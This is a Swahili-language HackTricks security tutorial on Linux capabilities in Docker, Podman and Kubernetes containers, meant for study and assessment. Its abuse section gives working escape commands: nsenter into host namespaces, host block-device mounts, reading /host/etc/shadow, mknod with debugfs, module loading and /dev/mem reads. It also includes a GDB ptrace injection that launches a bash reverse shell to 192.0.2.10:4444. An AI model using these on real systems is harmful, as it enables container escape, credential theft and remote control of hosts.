# Linux Capabilities Katika Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Linux capabilities ni mojawapo ya vipengele muhimu zaidi vya usalama wa container kwa sababu yanajibu swali tata lakini la msingi: **"root" humaanisha nini hasa ndani ya container?** Kwenye mfumo wa kawaida wa Linux, UID 0 kihistoria ilimaanisha seti pana sana ya privileges. Katika kernels za kisasa, privilege hiyo imegawanywa katika vitengo vidogo vinavyoitwa capabilities. Process inaweza kuendeshwa kama root na bado ikakosa uwezo wa kufanya shughuli nyingi zenye nguvu ikiwa capabilities husika zimeondolewa. <sup>[[1]](#references)</sup>

Containers hutegemea sana tofauti hii. Workloads nyingi bado huanzishwa kama UID 0 ndani ya container kwa sababu za uoanifu au urahisi. Bila kuondoa capabilities, hilo lingekuwa hatari sana. Kwa kuondoa capabilities, process ya root ndani ya container bado inaweza kufanya kazi nyingi za kawaida ndani ya container huku ikizuiwa kufanya shughuli nyeti zaidi za kernel. Ndiyo maana shell ya container inayoonyesha `uid=0(root)` haimaanishi moja kwa moja "host root" au hata "privilege pana ya kernel". Seti za capabilities huamua jinsi utambulisho huo wa root ulivyo na nguvu hasa.

Kwa marejeo kamili ya Linux capabilities na mifano mingi ya matumizi mabaya, angalia:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uendeshaji

Capabilities hufuatiliwa katika seti kadhaa, zikiwemo permitted, effective, inheritable, ambient, na bounding. Kwa tathmini nyingi za container, semantiki halisi za kernel za kila seti si muhimu sana kama swali la mwisho la kiutendaji: **ni shughuli zipi za privileged ambazo process hii inaweza kufanikiwa kufanya sasa hivi, na ni ongezeko gani la privilege linalowezekana baadaye?** <sup>[[1]](#references)</sup>

Sababu ya hili kuwa muhimu ni kwamba mbinu nyingi za breakout kwa hakika ni matatizo ya capabilities yaliyojificha kama matatizo ya container. Workload yenye `CAP_SYS_ADMIN` inaweza kufikia utendaji mwingi sana wa kernel ambao process ya kawaida ya root ya container haipaswi kugusa. Workload yenye `CAP_NET_ADMIN` huwa hatari zaidi ikiwa pia inashiriki host network namespace. Workload yenye `CAP_SYS_PTRACE` huwa ya kuvutia zaidi ikiwa inaweza kuona host processes kupitia kushiriki PID za host. Katika Docker au Podman, hilo linaweza kuonekana kama `--pid=host`; katika Kubernetes, kwa kawaida huonekana kama `hostPID: true`.

Kwa maneno mengine, seti ya capabilities haiwezi kutathminiwa peke yake. Ni lazima ichunguzwe pamoja na namespaces, seccomp, na sera za MAC.

## Maabara

Njia ya moja kwa moja sana ya kukagua capabilities ndani ya container ni:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Unaweza pia kulinganisha container yenye vizuizi vikali zaidi na ile ambayo capabilities zote zimeongezwa:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Ili kuona athari ya kuongeza kwa kiwango kidogo, jaribu kuondoa kila kitu kisha urudishe capability moja tu:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Majaribio haya madogo husaidia kuonyesha kwamba runtime haibadili tu thamani ya boolean inayoitwa "privileged". Inaunda uso halisi wa privileges unaopatikana kwa process.

## Capabilities Zenye Hatari Kubwa

Capabilities huwa primitives za escape pale tu operesheni yake inapofikia **rasilimali inayodhibitiwa na host**. Michanganyiko hii yenye hatari kubwa hujitokeza mara kwa mara:

- **`CAP_SYS_ADMIN`** pamoja na PID ya host, block device, au njia ya kuandika kwenye kernel-control. Kujiunga na mount namespace lengwa pia kunahitaji `CAP_SYS_CHROOT`; ku-mount filesystem inayotegemea block kunahitaji `CAP_SYS_ADMIN` katika initial user namespace.
- **`CAP_SYS_PTRACE`** pamoja na mwonekano wa PID za host na process ya host inayoweza kuunganishwa. `CAP_SYS_ADMIN` haihitajiki kwa ptrace injection.
- **`CAP_DAC_OVERRIDE` au `CAP_DAC_READ_SEARCH`** pamoja na filesystem ya host inayofikika. Capabilities hizi hupita ukaguzi tofauti wa DAC lakini hazitengenezi mwonekano wa filesystem ya host.
- **`CAP_SYS_MODULE`** katika initial user namespace pamoja na module inayokubaliwa na inayoendana na kernel. Linux containers za kawaida hushiriki kernel ya node; VM au userspace-kernel runtimes hubadilisha mpaka huo.
- **`CAP_MKNOD`** katika initial user namespace pamoja na kifaa halisi cha host ambacho device cgroup tayari inaruhusu. Kuunda node hakupiti device cgroup.
- **`CAP_SYS_RAWIO`** pamoja na interface ya memory, I/O-port, PCI, au device-control iliyo wazi na inayoweza kutumika.
- **`CAP_SYS_BOOT`** pamoja na initial PID namespace ili kuwasha upya host, au njia ya kexec inayoweza kutumika na inaruhusiwa kwa ajili ya kubadilisha kernel.
- **`CAP_NET_ADMIN`** katika host network namespace kwa ajili ya kudhibiti moja kwa moja hali ya mtandao wa node. **`CAP_NET_RAW`** inaweza kutumika katika escape inayohusiana na protocol maalum, lakini raw sockets pekee hazitoi shell ya node.

`CAP_SYS_CHROOT` haijaorodheshwa kimakusudi kama capability ya escape inayojitegemea. Inaweza kuhitajika na `setns()` ya mount namespace na inaweza kurahisisha kutumia mti wa host ambao tayari unafikika, lakini `chroot()` pekee haifichui mti huo wala kutoa ruhusa mpya za filesystem. Vivyo hivyo, `CAP_BPF` na `CAP_PERFMON` hufichua telemetry yenye uwezo mkubwa na attack surface ya kernel, lakini bila dosari tofauti ya kernel, operesheni zake za kawaida si njia za jumla za kutoroka container.

## Matumizi ya Runtime

Docker, Podman, stacks zinazotumia containerd, na CRI-O zote hutumia vidhibiti vya capability, lakini mipangilio chaguomsingi na interfaces za usimamizi hutofautiana. Docker huzionyesha moja kwa moja kupitia flags kama `--cap-drop` na `--cap-add`. Podman hutoa vidhibiti vinavyofanana na mara nyingi huviunganisha na rootless execution kama safu ya ziada ya usalama. Kubernetes huonyesha additions na drops za capability kupitia `securityContext` ya Pod au container; runtimes za kiwango cha chini huweka seti zinazotokana na hapo katika usanidi wa OCI runtime. Mazingira ya system-container kama LXC na Incus pia hutegemea udhibiti wa capability, lakini uunganishaji wake mpana zaidi na host unaweza kuwashawishi waendeshaji kulegeza mipangilio chaguomsingi zaidi kuliko ambavyo wangefanya kwa application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Kanuni hiyo hiyo inatumika kwa yote: capability inayoweza kutolewa kitaalamu si lazima iwe capability inayopaswa kutolewa. Matukio mengi halisi huanza pale mwendeshaji anapoongeza capability kwa sababu tu workload imeshindwa kufanya kazi chini ya usanidi wenye vizuizi zaidi, na timu ilihitaji suluhisho la haraka.

## Mipangilio Isiyo Sahihi

Kosa lililo wazi zaidi ni **`--cap-add=ALL`** katika CLI za mtindo wa Docker/Podman, lakini si kosa pekee. Kwa vitendo, tatizo linalojitokeza mara nyingi zaidi ni kutoa capability moja au mbili zenye nguvu sana, hasa `CAP_SYS_ADMIN`, ili "application ifanye kazi" bila kuelewa pia athari za namespace, seccomp, na mount. Hali nyingine ya kawaida ya kushindwa ni kuchanganya capabilities za ziada na kushiriki namespaces za host. Katika Docker au Podman, hii inaweza kuonekana kama `--pid=host`, `--network=host`, au `--userns=host`; katika Kubernetes, ufichuaji unaolingana nao mara nyingi huonekana kupitia mipangilio ya workload kama `hostPID: true` au `hostNetwork: true`. Kila mchanganyiko huo hubadilisha kile ambacho capability inaweza kuathiri hasa.

Pia ni jambo la kawaida kuona wasimamizi wakiamini kuwa kwa sababu workload haijawekwa `--privileged` kikamilifu, bado ina vizuizi vya maana. Wakati mwingine hilo ni kweli, lakini wakati mwingine hali halisi ya usalama huwa karibu vya kutosha na privileged kiasi kwamba tofauti hiyo haijalishi tena kiutendaji.

## Matumizi Mabaya

Anza kwa kurekodi seti zinazotumika, mapping ya user-namespace, hali ya seccomp, namespaces, mounts, na vifaa. Jina la capability bila muktadha huu halithibitishi escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces na vifaa vya block

Kwa uwezo wa kuona PID za host, `CAP_SYS_ADMIN` inaweza kuingia kwenye namespaces za host. Operesheni ya mount-namespace pia inahitaji `CAP_SYS_CHROOT` katika user namespace ya mpigaji.

**Kagua capability na vizuizi vya usalama:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Fanya enumeration ya target:** thibitisha host PID sharing kupitia usanidi wa container/Pod au orodha ya host processes isiyo na utata, kisha kagua target namespaces. PID 1 ya ndani hupatikana pia katika private PID namespaces, kwa hiyo uwepo wake pekee hauthibitishi host PID sharing.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Tumia vibaya njia ya namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Ukaguzi wa capabilities lazima ufaulu katika user namespaces zinazomiliki targets. `--pid=host` au Kubernetes `hostPID: true` huwezesha kuona targets; hakuwezeshi capabilities.

Kwa njia mbadala ya block-device, **enumerate** candidates, kisha **exploit** filesystem inayofikika kwa ku-mount candidate iliyothibitishwa katika hali ya read-only kwanza:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Nodi ya kifaa lazima iwepo, device cgroup lazima iruhusu kifaa hicho, na mounts za block filesystem zinahitaji `CAP_SYS_ADMIN` katika initial user namespace. Root ya host ambayo tayari imewekwa kwa bind mount kwenye `/host` inatoa ufikiaji wa host **bila** `CAP_SYS_ADMIN`; `chroot /host` ni njia ya kurahisisha tu na inahitaji `CAP_SYS_CHROOT` kando.

### Root ya host inayofikika: utekelezaji wa moja kwa moja wa filesystem

Ikiwa root ya host tayari imewekwa kwenye `/host`, thibitisha kwanza mount kisha utumie ufikiaji uliopo moja kwa moja. Njia hii haitegemei `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Ikiwa `chroot()` haipatikani lakini binary ya host inaoana na usanifu na loader ya container, mara nyingi inaweza kuitwa kupitia mti uliowekwa kwenye mount badala yake:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Kusoma na kuandika moja kwa moja ndani ya `/host` tayari kunamaanisha kuathiri mfumo wa faili wa host. `chroot()` au kutekeleza binary ya host hurahisisha tu ufikiaji huo; hakuna kati ya operesheni hizi inayounda mount ya host au kukwepa mount ya kusoma tu au sera ya MAC.

### `CAP_SYS_PTRACE`: host-process injection

Kwa kuona PID za host na kuwa na `CAP_SYS_PTRACE` katika user namespace ya lengo, GDB inaweza kufanya mchakato wa host ulioidhinishwa uite `system()`. `CAP_SYS_ADMIN` haihitajiki.

**Angalia uwezo na vidhibiti vya kuambatisha:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Orodhesha na uchague lengo linaloweza kutupwa:** thibitisha ushirikishwaji wa PID ya host kupitia usanidi au orodha ya michakato ya node iliyo wazi; usichague kamwe PID 1 au daemon muhimu.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploit mchakato uliochaguliwa:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Lengo lazima liweze kuunganishwa nalo na liwe na alama ya `system()` inayoweza kutumika pamoja na njia ya Bash payload. Yama, hali ya kutoweza kutengeneza dump, seccomp, user namespaces na sera ya MAC vinaweza kuzuia mnyororo huu. GDB husimamisha lengo wakati imeunganishwa nalo, kwa hivyo tumia tu mchakato wa majaribio unaoweza kutupwa.

### `CAP_DAC_OVERRIDE` na `CAP_DAC_READ_SEARCH`: faili za host zilizolindwa

Uwezo huu hauonyeshi mfumo wa faili wa host. Ikiwa `/host` tayari ni mount ya host, `CAP_DAC_READ_SEARCH` inaweza kupita ukaguzi wa DAC wa kusoma/kutafuta, na `CAP_DAC_OVERRIDE` inaweza pia kupita ukaguzi wa kawaida wa kuandika:

**Kagua uwezo:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Orodhesha mfumo wa faili wa hosti uliofichuliwa na ruhusa za lengwa:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Jaribu njia za kukwepa vizuizi vya kusoma na kuandika** katika maabara ya muda mfupi:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Mount ya kusoma pekee na sheria za LSM bado hutumika. `CAP_DAC_READ_SEARCH` pia huruhusu `open_by_handle_at()`, lakini kutoroka kwenye container kama Shocker kunahitaji pia file descriptor ya mount ya mfumo uleule wa faili, handles halali au zinazoweza kugunduliwa, mpangilio unaooana wa mfumo wa faili/hifadhi, na kutokuwepo kwa kizuizi cha runtime au LSM. Haiwezeshi ufikiaji holela kwa kila mfumo wa faili ulio nje ya mount namespace.

### `CAP_SYS_MODULE`: utekelezaji kwenye kernel inayoshirikiwa

Katika container ya kawaida ya Linux, module inayokubaliwa huendeshwa kwenye kernel inayoshirikiwa na host.

**Angalia capability na upeo wa user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Orodhesha mahitaji ya awali ya kupakia moduli:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Tumia Exploit tu kwa proof module inayooana, iliyokaguliwa mapema, kwenye node ya muda:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability lazima iwe effective katika initial user namespace. Toleo na usanidi wa kernel, sahihi za module, lockdown, seccomp, na sera ya LSM lazima ziruhusu upakiaji. Kata, gVisor, Hyper-V isolation, na runtime zinazofanana hubadilisha mpaka wa kernel ambao workload hufikia.

### `CAP_MKNOD`: kuunda handle ya kifaa inayoruhusiwa

`CAP_MKNOD` huunda node ya kifaa lakini haikiuki device cgroup. Uundaji wa kifaa hauwekewi namespace, kwa hivyo capability lazima iwe effective katika initial user namespace.

**Angalia capability na upeo wa user namespace:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Orodhesha vifaa halisi, nambari zake za major/minor, na allowlist yoyote inayoonekana ya cgroup-v1:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit candidate ya ext-family iliyothibitishwa katika hali ya kusoma tu:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Mifumo mingine ya faili inahitaji zana inayolingana ya kusoma pekee; kuweka kifaa pia kunahitaji `CAP_SYS_ADMIN`. `Operation not permitted` wakati wa kufungua node iliyoundwa kwa kawaida huashiria kuwa device cgroup bado inazuia ufikiaji wake. Chini ya cgroup v2, ufikiaji wa vifaa kwa kawaida hutekelezwa kwa BPF, na hakuna faili ya `devices.list`; kwa hiyo, jaribio la kufungua kifaa likifaulu ndilo kipimo cha mwisho.

### `CAP_SYS_RAWIO`: kiolesura cha raw-I/O kilicho wazi

Hakuna payload ya jumla inayoweza kutumika kwenye mifumo yote: anwani halali na matokeo hutegemea hardware na usanidi wa kernel.

**Angalia capability na upeo wa user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Orodhesha miingiliano ghafi, maunzi na viendeshi vilivyo wazi:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Tumia Exploit tu kwa uthibitisho ulioidhinishwa kwa kifaa na masafa ya anwani yaliyotambuliwa.** Ikiwa `/dev/mem` ndiyo kiolesura kilichoidhinishwa na maabara, template hii huthibitisha ufichuaji wa kumbukumbu ya node bila kuchapisha yaliyomo:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Anwani lazima itokane na ramani ya hardware ya maabara, kwa sababu kusoma baadhi ya maeneo ya MMIO kunaweza kusababisha athari za pembeni. Amri ya jumla ya kuandika kwenye kumbukumbu inaweza kupotosha na kuwa hatari: anwani ileile inaweza isiwe na madhara kwenye mashine moja, lakini ikadhibiti hardware au kumbukumbu ya kernel kwenye mashine nyingine. Device cgroups, ruhusa za mfumo wa faili, vizuizi vikali vya `/dev/mem`, kernel lockdown, virtualization na sera za LSM kwa kawaida huzuia ufikiaji unaoweza kutumika.

### `CAP_SYS_BOOT`: kuwasha upya namespace au kubadilisha kernel

Katika private PID namespace, `reboot()` husitisha mchakato wa init wa namespace hiyo badala ya kuwasha upya host. Kwa hiyo, athari ya kuwasha upya host inahitaji initial PID namespace, kwa kawaida kupitia kushiriki PID za host. Njia ya kexec pia inahitaji image ya kernel inayooana na sera za lockdown/uthibitishaji wa sahihi zisizo na vizuizi:

**Angalia capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Orodhesha masharti ya awali ya PID-namespace na kexec:** thibitisha kushiriki kwa PID za host kupitia usanidi wa workload, kwa sababu kiungo cha PID namespace pekee hakionyeshi kama hiyo ndiyo namespace ya awali ya node.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Tumia exploit tu ikiwa kuwasha upya node ya maabara ya muda ndilo zoezi lililowekwa wazi:**

```bash
sync
reboot -f
```

Usitoe amri hiyo wala kupakia kernel kwenye node inayotumiwa na wengine kwa lengo la kuthibitisha tu uwezo huo. Katika PID namespace ya faragha, humaliza tu mchakato wa init wa namespace hiyo na haionyeshi athari kwa host.

### `CAP_NET_ADMIN` na `CAP_NET_RAW`: njia za mtandao za host

`CAP_NET_ADMIN` huathiri network namespace ya sasa pekee.

**Angalia capabilities na vizuizi:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Orodhesha mtandao wa sasa na uthibitishe host networking kutoka kwenye usanidi wa workload:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Jaribu `CAP_NET_ADMIN` kwa njia inayoweza kutenduliwa:** ukiwa na host networking, interface ya muda ni interface ya node.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` huruhusu soketi za RAW na PACKET lakini si shell ya jumla ya host. Ili **kuorodhesha** mnyororo wa GCE ulioandikwa, angalia route ya metadata na unasa kama trafiki ya plaintext ya guest-agent inaweza kuonekana:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Ikiwa masharti ya awali yanayolingana yapo, **exploit** mnyororo unaotegemea mazingira kama ilivyoelezwa kwenye [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): nasa ombi na hali ya mfuatano, ingiza jibu bandia la metadata lenye ufunguo wa SSH, kisha thibitisha ufikiaji wa host. Mnyororo huu ulihitaji root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, mawasiliano ya plaintext ya GCE metadata, na ombi la guest-agent ambalo linaweza kushindaniwa kwa timing; tabia za kisasa za usafirishaji au agent zinaweza kuuzuia.

### Vizuizi vya chanzo cha ndani na anwani za interface

Listener inaweza kukataa miunganisho ambayo chanzo chake ni `127.0.0.1` lakini kupuuza anwani nyingine iliyopewa network namespace hiyo hiyo. Ikiwa listener inaweza kufikiwa kupitia interface hiyo, linganisha muunganisho wa loopback na ule unaotumia anwani ya ndani isiyo ya loopback ambayo tayari imepewa interface. `CAP_NET_ADMIN` inaweza kuruhusu usanidi wa interface katika namespace ya sasa, lakini haihitajiki ikiwa anwani inayofaa tayari imepewa. `CAP_NET_RAW` si sharti la muunganisho wa kawaida wa TCP. Hili ni hitilafu ya uainishaji wa anwani ya chanzo, si container escape wala uthibitisho kwamba programu itaidhinisha ombi lenye ruhusa za juu.<sup>[[1]](#references)[[7]](#references)</sup>

Kwa listener ya WebSocket, jibu halali la HTTP `101 Switching Protocols` linathibitisha kuwa handshake ya awali imekamilika; hitilafu ya kiwango cha programu inayofuata inaweza kuonyesha kuwa muunganisho umefika kwa handler. Hakuna kati ya majibu hayo linalothibitisha kuwa uthibitishaji au operesheni iliyoombwa imefaulu.<sup>[[8]](#references)</sup>

## Ukaguzi

Lengo la ukaguzi wa capabilities si kuonyesha tu thamani ghafi, bali kuelewa ikiwa mchakato una ruhusa za kutosha kufanya hali yake ya sasa ya namespace na mount iwe hatari.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Ni nini kinachovutia hapa:

- `capsh --print` ndiyo njia rahisi zaidi ya kubaini capabilities zenye hatari kubwa kama vile `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, au `cap_sys_module`.
- Mstari wa `CapEff` katika `/proc/self/status` hukuambia ni capabilities zipi zinazotumika kwa sasa, si zile tu ambazo huenda zinapatikana katika seti nyingine.
- Orodha ya capabilities huwa muhimu zaidi ikiwa container pia inashiriki namespaces za host za PID, network, au user, au ina mounts za host zinazoweza kuandikwa.

Baada ya kukusanya maelezo ghafi ya capabilities, hatua inayofuata ni kuyatafsiri. Jiulize ikiwa mchakato ni root, ikiwa user namespaces zinatumika, ikiwa namespaces za host zinashirikiwa, ikiwa seccomp inatekelezwa, na ikiwa AppArmor au SELinux bado zinaweka vikwazo kwa mchakato. Seti ya capabilities peke yake ni sehemu tu ya hadithi, lakini mara nyingi ndiyo hufafanua kwa nini container breakout moja inafanikiwa na nyingine inashindwa licha ya kuanzia katika hali inayoonekana kuwa sawa.

## Mipangilio Chaguomsingi ya Runtime

| Runtime / jukwaa | Hali chaguomsingi | Tabia chaguomsingi | Njia za kawaida za kulegeza vizuizi kwa mikono |
| --- | --- | --- | --- |
| Docker Engine | Seti ya capabilities iliyopunguzwa kwa chaguomsingi | Docker huhifadhi allowlist chaguomsingi ya capabilities na kuondoa zilizobaki | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Seti ya capabilities iliyopunguzwa kwa chaguomsingi | Containers za Podman hazina upendeleo maalum kwa chaguomsingi na hutumia modeli ya capabilities iliyopunguzwa | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hurithi mipangilio chaguomsingi ya runtime isipobadilishwa | Ikiwa hakuna `securityContext.capabilities` zilizobainishwa, container hupata seti chaguomsingi ya capabilities kutoka kwa runtime | `securityContext.capabilities.add`, kushindwa kuweka `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O chini ya Kubernetes | Kwa kawaida mipangilio chaguomsingi ya runtime | Seti inayotumika hutegemea runtime pamoja na vipimo vya Pod | sawa na safu ya Kubernetes; usanidi wa moja kwa moja wa OCI/CRI unaweza pia kuongeza capabilities waziwazi |

Kwa Kubernetes, jambo muhimu ni kwamba API haifafanui seti moja ya capabilities inayotumika chaguomsingi kila mahali. Ikiwa Pod haiongezi wala kuondoa capabilities, workload hurithi mipangilio chaguomsingi ya runtime ya node hiyo.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Usanidi wa container ya Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Upendeleo wa runtime na Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Nyaraka za Kubernetes - Kuweka capabilities kwa container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Nyaraka za Podman - `--cap-add` na `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Nyaraka za Incus - Usalama](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Utekelezaji wa itifaki ya IPv4 katika Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - Itifaki ya WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
